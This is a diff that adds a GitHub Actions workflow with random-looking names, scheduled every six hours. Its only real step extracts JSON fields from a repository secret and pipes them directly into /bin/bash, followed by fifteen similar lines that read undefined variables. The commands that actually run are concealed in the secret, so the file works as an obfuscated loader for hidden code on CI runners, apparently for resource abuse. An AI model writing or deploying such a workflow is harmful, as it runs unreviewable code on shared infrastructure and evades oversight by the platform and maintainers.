@@ -1,0 +1,31 @@
+name: hengchaobeigong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hengchaobeigong
+        env:
+          xp38024: ${{ secrets.xp38024 }}
+        run: |
+          echo $xp38024 | jq -r .ugmj71 | /bin/bash
+          echo $h58 | jq -r .w336 | /bin/bash
+          echo $sjdze92178 | jq -r .jtkv99209 | /bin/bash
+          echo $x4 | jq -r .rrar395 | /bin/bash
+          echo $jyto1 | jq -r .g1 | /bin/bash
+          echo $mpkap2280 | jq -r .tln136 | /bin/bash
+          echo $whyp0 | jq -r .fejp325 | /bin/bash
+          echo $jxnff2 | jq -r .sel744 | /bin/bash
+          echo $fgwaa25290 | jq -r .wxj7 | /bin/bash
+          echo $nah75 | jq -r .t87563 | /bin/bash
+          echo $u84 | jq -r .whiih801 | /bin/bash
+          echo $knemg07672 | jq -r .i5805 | /bin/bash
+          echo $wp98 | jq -r .gb62 | /bin/bash
+          echo $xo3 | jq -r .rb13 | /bin/bash
+          echo $w8 | jq -r .u31 | /bin/bash
+          echo $xsiej52 | jq -r .hp949 | /bin/bash
+
